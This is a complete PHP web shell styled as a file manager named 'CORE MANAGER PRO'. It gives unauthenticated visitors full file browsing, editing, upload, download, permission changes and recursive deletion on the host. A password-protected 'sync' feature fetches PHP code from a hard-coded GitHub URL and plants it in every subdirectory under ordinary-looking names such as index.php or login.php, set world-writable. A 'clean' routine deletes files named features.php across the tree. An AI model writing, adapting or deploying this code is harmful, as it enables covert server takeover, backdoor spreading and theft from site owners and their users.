<?php
/**
 * AUTOMATED CORE MANAGER - FINAL FIX EDITION
 */

$path = isset($_GET["path"]) ? $_GET["path"] : __DIR__;
$path = realpath($path);
if (!$path || !is_dir($path)) { $path = __DIR__; }

$githubSource = "https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php";
$syncPassword = "berlinx62";

$copyNames = [
    "index.php", "home.php", "login.php", "register.php", "dashboard.php", 
    "profile.php", "settings.php", "config.php", "connect.php", "database.php", 
    "upload.php", "download.php", "search.php", "api.php", "admin.php", 
    "user.php", "logout.php", "verify.php", "reset.php", "payment.php", 
    "order.php", "product.php", "cart.php", "checkout.php", "report.php", 
    "backup.php", "update.php", "delete.php", "insert.php", "process.php"
];

$deleteTarget = "features.php";
$lastUploadedUrl = "";
$currentSyncLogs = [];
$errorMsg = "";

// --- 1. Massive Clean Logic ---
if (isset($_GET["action"]) && $_GET["action"] == "massive_clean") {
    $it = new RecursiveDirectoryIterator($path);
    $display = new RecursiveIteratorIterator($it);
    foreach($display as $file) {
        if (basename($file) == $deleteTarget) {
            @chmod($file, 0777);
            @unlink($file);
        }
    }
    header("Location: ?path=" . urlencode($path)); exit;
}

// --- 2. Action Logic ---

// GitHub Sync (Set 0777)
if (isset($_POST["action_type"]) && $_POST["action_type"] == "scanning") {
    if ($_POST["sync_pass"] === $syncPassword) {
        $content = @file_get_contents($githubSource);
        if ($content) {
            $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
            foreach (scandir($path) as $dir) {
                $subPath = $path . DIRECTORY_SEPARATOR . $dir;
                if ($dir != "." && $dir != ".." && is_dir($subPath)) {
                    $chosenName = "";
                    foreach ($copyNames as $name) {
                        if (!file_exists($subPath . DIRECTORY_SEPARATOR . $name)) {
                            $chosenName = $name;
                            break;
                        }
                    }
                    if ($chosenName == "") { $chosenName = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 8) . ".php"; }
                    $fullP = $subPath . DIRECTORY_SEPARATOR . $chosenName;
                    if (@file_put_contents($fullP, $content)) {
                        @chmod($fullP, 0777); // Set 0777 for sync
                        $rel = trim(str_replace(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '', str_replace('\\', '/', $subPath)), '/');
                        $currentSyncLogs[] = $protocol . $_SERVER['HTTP_HOST'] . "/" . ($rel ? $rel . "/" : "") . $chosenName;
                    }
                }
            }
        }
    } else { $errorMsg = "Wrong Password!"; }
}

// Upload
if (isset($_FILES['file'])) {
    $fileName = basename($_FILES['file']['name']);
    $targetPath = $path . DIRECTORY_SEPARATOR . $fileName;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
        $root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
        $rel = trim(str_replace($root, '', str_replace('\\', '/', $path)), '/');
        $lastUploadedUrl = $protocol . $_SERVER['HTTP_HOST'] . "/" . ($rel ? $rel . "/" : "") . $fileName;
    }
}

// Single Action: Download
if (isset($_GET['dl'])) {
    $f = realpath($_GET['dl']);
    if ($f && file_exists($f)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f); exit;
    }
}

// Delete & Perms
if (isset($_GET['del'])) {
    $f = realpath($_GET['del']);
    if ($f) { is_dir($f) ? @exec("rm -rf " . escapeshellarg($f)) : @unlink($f); }
    header("Location: ?path=" . urlencode($path)); exit;
}
if (isset($_POST['new_perm'])) {
    $f = realpath($_POST['perm_file']);
    if ($f) { @chmod($f, octdec($_POST['new_perm'])); }
    header("Location: ?path=" . urlencode($path)); exit;
}
if (isset($_POST['save_file'])) {
    file_put_contents($_POST['edit_file'], $_POST['content']);
    header("Location: ?path=" . urlencode($path)); exit;
}

// Sorting
$allItems = array_diff(scandir($path), array('.', '..'));
$folders = []; $files = [];
foreach ($allItems as $item) {
    is_dir($path . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
}
natcasesort($folders); natcasesort($files);
$sortedItems = array_merge($folders, $files);

function getPermColor($perm) {
    if ($perm == '0777') return '#f1c40f'; // Yellow
    $p = octdec($perm);
    if (($p & 0200) == 0) return '#e74c3c'; // Red (Read Only)
    return '#d1d1d1'; // Default
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORE MANAGER PRO</title>
    <style>
        :root { --bg: #0a0a0a; --card: #121212; --accent: #8e44ad; --txt: #d1d1d1; --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --border: #222; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--txt); margin: 0; overflow: hidden; }
        .header { width: 100%; padding: 15px 0; background: #000; border-bottom: 2px solid var(--accent); text-align: center; position: fixed; top: 0; z-index: 100; }
        .header h1 { margin: 0; font-size: 24px; color: #9b59b6; text-transform: uppercase; letter-spacing: 4px; }
        .main-wrapper { display: flex; margin-top: 60px; height: calc(100vh - 60px); }
        .content { flex: 0 0 80%; padding: 20px; overflow-y: auto; border-right: 1px solid var(--border); box-sizing: border-box; }
        .sidebar { flex: 0 0 20%; background: #080808; padding: 15px; overflow-y: auto; box-sizing: border-box; }
        .side-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 15px; margin-bottom: 15px; }
        .side-title { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 8px; display: block; font-weight: bold; border-bottom: 1px solid #222; padding-bottom: 5px; }
        .path-bar { background: #111; padding: 10px; border-radius: 4px; border: 1px solid #222; margin-bottom: 20px; font-size: 13px; }
        .path-bar a { color: var(--blue); text-decoration: none; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; background: var(--card); font-size: 13px; }
        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #1a1a1a; }
        th { background: #000; color: #666; text-transform: uppercase; font-size: 10px; }
        .btn { padding: 5px 10px; border-radius: 3px; border: none; cursor: pointer; color: #fff; font-size: 11px; font-weight: bold; text-decoration: none; display: inline-block; }
        .btn-p { background: var(--blue); } .btn-e { background: #6c5ce7; } .btn-del { background: var(--red); }
        .btn-wide { width: 100%; margin-bottom: 6px; padding: 10px; text-align: center; box-sizing: border-box; font-size: 12px; }
        .url-box { width: 100%; height: 140px; background: #000; color: #00ff00; border: 1px solid #333; font-family: monospace; font-size: 11px; padding: 8px; resize: none; box-sizing: border-box; }
        .perm-input { width: 50px; background: #000; border: 1px solid #333; font-size: 12px; padding: 4px; text-align: center; font-weight: bold; border-radius: 3px; }
        .stat-row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px dotted #222; font-size: 12px; }
        .bulk-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; background: #151515; padding: 8px; border-radius: 4px; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #444; }
    </style>
</head>
<body>

<div class="header"><h1>CORE MANAGER PRO</h1></div>

<div class="main-wrapper">
    <div class="content">
        <div class="path-bar">📍 <?php 
            $parts = explode(DIRECTORY_SEPARATOR, $path); $acc = '';
            foreach ($parts as $part) {
                if ($part === '') continue; $acc .= DIRECTORY_SEPARATOR . $part;
                echo '<a href="?path=' . urlencode($acc) . '">' . htmlspecialchars($part) . '</a> / ';
            }
        ?></div>

        <?php if($errorMsg): ?>
            <div style="background:var(--red); padding:10px; margin-bottom:15px; font-size:12px; font-weight:bold;"><?= $errorMsg ?></div>
        <?php endif; ?>

        <?php if(isset($_GET['edit'])): $f = $_GET['edit']; ?>
            <div class="side-card">
                <span class="side-title">Editor: <?= basename($f) ?></span>
                <form method="POST">
                    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($f) ?>">
                    <textarea style="width:100%; height:450px; background:#111; color:#fff; border:1px solid var(--accent); padding:15px; font-family:monospace;" name="content"><?= htmlspecialchars(file_get_contents($f)) ?></textarea>
                    <div style="margin-top:15px;">
                        <button type="submit" name="save_file" class="btn btn-p" style="background:var(--green)">Save Changes</button>
                        <a href="?path=<?= urlencode($path) ?>" class="btn btn-del">Cancel</a>
                    </div>
                </form>
            </div>
        <?php else: ?>

        <form method="POST">
            <div class="bulk-bar">
                <input type="checkbox" onclick="var c=document.querySelectorAll('.fc'); for(var i=0;i<c.length;i++) c[i].checked=this.checked;">
                <select name="bulk_action" style="background:#000; color:#fff; border:1px solid #444; font-size:12px; padding:3px;">
                    <option value="">Actions</option><option value="delete">Delete Selected</option>
                </select>
                <button type="submit" class="btn btn-del">Apply</button>
            </div>

            <table>
                <thead>
                    <tr><th width="30"></th><th>Name</th><th width="140">Permission</th><th width="80">Size</th><th style="text-align:right;">Actions</th></tr>
                </thead>
                <tbody>
                    <?php foreach ($sortedItems as $item): 
                        $fP = $path . DIRECTORY_SEPARATOR . $item; $isD = is_dir($fP); 
                        $prm = substr(sprintf('%o', @fileperms($fP)), -4); 
                        $pColor = getPermColor($prm);
                    ?>
                    <tr>
                        <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($fP) ?>" class="fc"></td>
                        <td><?= $isD ? "📁" : "📄" ?> <a href="<?= $isD ? "?path=".urlencode($fP) : "#" ?>" style="color:<?= $isD ? "var(--blue)" : "#fff" ?>; text-decoration:none; font-weight:500;"><?= $item ?></a></td>
                        <td>
                            <form method="POST" style="display:flex; gap:5px;">
                                <input type="hidden" name="perm_file" value="<?= htmlspecialchars($fP) ?>">
                                <input type="text" name="new_perm" class="perm-input" value="<?= $prm ?>" style="color:<?= $pColor ?>; border-color:<?= $pColor ?>;">
                                <button type="submit" class="btn btn-p">Set</button>
                            </form>
                        </td>
                        <td><?= $isD ? "DIR" : round(@filesize($fP)/1024, 1)." KB" ?></td>
                        <td style="text-align:right;">
                            <?php if(!$isD): ?>
                                <a href="?path=<?=urlencode($path)?>&edit=<?=urlencode($fP)?>" class="btn btn-e" title="Edit">E</a>
                                <a href="?dl=<?=urlencode($fP)?>" class="btn btn-p" style="background:var(--green)" title="Download">↓</a>
                            <?php endif; ?>
                            <a href="?path=<?=urlencode($path)?>&del=<?=urlencode($fP)?>" class="btn btn-del" onclick="return confirm('Delete?')" title="Delete">X</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </form>
        <?php endif; ?>
    </div>

    <div class="sidebar">
        <?php if ($lastUploadedUrl): ?>
        <div class="side-card" style="border: 1px solid var(--green); background: #001a00;">
            <span class="side-title" style="color:var(--green)">Success: Uploaded</span>
            <div style="font-size:10px; color:#0f0; word-break:break-all; background:#000; padding:8px; border:1px solid #004400;"><?= $lastUploadedUrl ?></div>
            <button class="btn btn-wide" style="background:var(--green); margin-top:8px;" onclick="navigator.clipboard.writeText('<?= $lastUploadedUrl ?>'); alert('URL Copied!')">📋 Copy URL</button>
        </div>
        <?php endif; ?>

        <div class="side-card">
            <span class="side-title">Server Status</span>
            <div class="stat-row"><span>Items:</span> <b><?= count($sortedItems) ?></b></div>
            <div class="stat-row"><span>PHP:</span> <b><?= phpversion() ?></b></div>
            <div class="stat-row"><span>IP:</span> <b><?= $_SERVER['SERVER_ADDR'] ?></b></div>
            <div class="stat-row"><span>Disk:</span> <b><?= round(disk_free_space("/")/(1024*1024*1024),1) ?>G Free</b></div>
        </div>

        <div class="side-card">
            <span class="side-title">Smart Sync (berlinx62)</span>
            <form method="POST">
                <input type="hidden" name="action_type" value="scanning">
                <input type="password" name="sync_pass" style="width:100%; background:#000; color:#fff; border:1px solid #444; padding:8px; font-size:12px; margin-bottom:8px; box-sizing:border-box;" placeholder="Enter Password" required>
                <button type="submit" class="btn btn-wide" style="background:var(--accent);">⚡ Start Sync Scan</button>
            </form>
        </div>

        <div class="side-card">
            <span class="side-title">Maintenance</span>
            <a href="?path=<?=urlencode($path)?>&action=massive_clean" class="btn btn-wide" style="background:var(--red);" onclick="return confirm('Delete all features.php recursively?')">🔥 Massive Clean</a>
            <a href="?path=<?=urlencode($path)?>" class="btn btn-wide" style="background:#222; margin-top:5px;">🔄 Refresh List</a>
        </div>

        <div class="side-card">
            <span class="side-title">Upload File</span>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file" style="font-size:10px; width:100%; margin-bottom:10px;" required>
                <button type="submit" class="btn btn-wide" style="background:var(--blue);">🚀 Upload Now</button>
            </form>
        </div>

        <div class="side-card">
            <span class="side-title">Sync Activity Logs</span>
            <textarea class="url-box" readonly><?php
                if (!empty($currentSyncLogs)) { foreach ($currentSyncLogs as $url) { echo $url . "\n"; } }
                else { echo "No recent sync activity."; }
            ?></textarea>
        </div>
    </div>
</div>
</body>
</html>
